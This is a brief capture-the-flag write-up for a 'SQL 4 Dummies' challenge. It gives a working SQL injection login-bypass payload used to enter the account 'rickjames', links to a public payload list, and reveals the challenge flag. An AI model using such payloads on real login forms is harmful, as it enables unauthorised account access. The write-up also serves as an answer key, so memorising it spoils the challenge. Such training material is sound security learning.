# SQL 4 Dummies

## Description
Break into ole Professor James' school account. I think his username is rickjames.

https://bluehens-sql-for-dummies-service.chals.io/

-Dave the Daemonslayer

## Solution
The login page of this challenge is vulnerable to SQL injection attack.
The payload to successfully login as rickjames was:
```
rickjames' OR '1-- -
```

![Payload](./payload.png)

You can check another payload for SQL injection attack using this [link](https://github.com/payloadbox/sql-injection-payload-list)

![Flag](./flag.png)

## Flag
`UDCTF{wh4ts_my_n4m3_4g4in?}`